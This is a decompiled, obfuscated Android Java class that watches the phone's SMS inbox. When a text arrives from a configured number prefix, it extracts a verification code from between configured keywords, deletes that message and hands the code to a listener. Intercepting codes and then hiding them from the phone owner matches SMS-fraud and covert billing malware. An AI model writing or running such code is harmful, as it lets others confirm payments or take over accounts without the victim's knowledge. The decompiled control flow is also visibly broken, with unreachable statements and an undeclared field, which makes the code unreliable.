package com.yl.ml.b;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;
import android.os.Handler;
import com.yl.codelib.comm.MyPreference;
import com.yl.codelib.sim.SmsContent;
import com.yl.codelib.sim.SmsInfo;
import com.yl.codelib.utils.LogUtil;
import com.yl.codelib.utils.TextUtil;
import com.yl.ml.listen.SReceiverListener;
import java.util.ArrayList;

final class P
  extends ContentObserver
{
  private boolean aR = false;
  private Context aU;
  private String aV;
  private SReceiverListener aW;
  private String aX;
  private String aY;
  private long aZ;
  private long starttime;
  
  public P(MA paramMA, Handler paramHandler, Context paramContext, String paramString1, SReceiverListener paramSReceiverListener, long paramLong, String paramString2, String paramString3)
  {
    super(paramHandler);
    this.aU = paramContext;
    this.aV = paramString1;
    this.aW = paramSReceiverListener;
    this.starttime = paramLong;
    this.aX = paramString2;
    this.aY = paramString3;
    paramHandler = new Q(this, paramSReceiverListener);
    this.aZ = MA.b(paramMA).readLong("TIME_YZMWAIT", 60000L);
    new Thread(new R(this, paramHandler)).start();
  }
  
  public final void onChange(boolean paramBoolean)
  {
    LogUtil.v("selfChange");
    if (this.aR)
    {
      MA.a(this.ak).getContentResolver().unregisterContentObserver(this);
      return;
    }
    if (System.currentTimeMillis() - this.starttime > this.aZ)
    {
      LogUtil.v("timeout");
      return;
    }
    SmsInfo localSmsInfo;
    try
    {
      ArrayList localArrayList = SmsContent.getSmsInfo(this.aU, "content://sms/inbox");
      if ((localArrayList != null) && (localArrayList.size() > 0))
      {
        localSmsInfo = (SmsInfo)localArrayList.get(0);
        if ((localSmsInfo != null) && (TextUtil.notNull(localSmsInfo.getPhoneNumber())))
        {
          LogUtil.v(localSmsInfo.getDate() + "info.getDate()");
          LogUtil.v(this.starttime + "starttime");
          if (Long.valueOf(localSmsInfo.getDate()).longValue() >= this.starttime) {
            break label191;
          }
          LogUtil.v("timereturn");
        }
      }
    }
    catch (Exception localException)
    {
      this.aW.receiver(null, "ex");
    }
    for (;;)
    {
      super.onChange(paramBoolean);
      return;
      label191:
      LogUtil.v(localSmsInfo.getPhoneNumber() + "===");
      LogUtil.v(localSmsInfo.getSmsbody() + "===");
      String str = localSmsInfo.getPhoneNumber();
      Object localObject = str;
      if (str.startsWith("+86")) {
        localObject = str.replace("+86", "");
      }
      if (((String)localObject).startsWith(this.aV))
      {
        this.aR = true;
        MA.a(this.ak).getContentResolver().unregisterContentObserver(this);
        str = localSmsInfo.getSmsbody();
        if ((!TextUtil.notNull(this.aX)) && (TextUtil.notNull(this.aY)))
        {
          if (str.contains(this.aY))
          {
            str = TextUtil.cleanChar(str.substring(0, str.indexOf(this.aY)));
            SmsContent.deteleSms_phoneNum(MA.a(this.ak), "content://sms/inbox", localSmsInfo.getPhoneNumber());
            this.aW.receiver((String)localObject, str);
          }
          else
          {
            SmsContent.deteleSms_phoneNum(MA.a(this.ak), "content://sms/inbox", localSmsInfo.getPhoneNumber());
            this.aW.receiver(null, "nokey");
          }
        }
        else if ((TextUtil.notNull(this.aX)) && (!TextUtil.notNull(this.aY)))
        {
          if (str.contains(this.aX))
          {
            str = TextUtil.cleanChar(str.substring(str.indexOf(this.aX) + this.aX.length(), str.length()));
            SmsContent.deteleSms_phoneNum(MA.a(this.ak), "content://sms/inbox", localSmsInfo.getPhoneNumber());
            this.aW.receiver((String)localObject, str);
          }
          else
          {
            SmsContent.deteleSms_phoneNum(MA.a(this.ak), "content://sms/inbox", localSmsInfo.getPhoneNumber());
            this.aW.receiver(null, "nokey");
          }
        }
        else if ((TextUtil.notNull(this.aX)) && (TextUtil.notNull(this.aY))) {
          if ((str.contains(this.aX)) && (str.contains(this.aY)))
          {
            int i = str.indexOf(this.aX) + this.aX.length();
            str = TextUtil.cleanChar(str.substring(i, str.indexOf(this.aY, i)));
            SmsContent.deteleSms_phoneNum(MA.a(this.ak), "content://sms/inbox", localSmsInfo.getPhoneNumber());
            this.aW.receiver((String)localObject, str);
          }
          else
          {
            SmsContent.deteleSms_phoneNum(MA.a(this.ak), "content://sms/inbox", localSmsInfo.getPhoneNumber());
            this.aW.receiver(null, "nokey");
            continue;
            this.aR = true;
            MA.a(this.ak).getContentResolver().unregisterContentObserver(this);
            this.aW.receiver(null, "nomsg");
          }
        }
      }
    }
  }
}
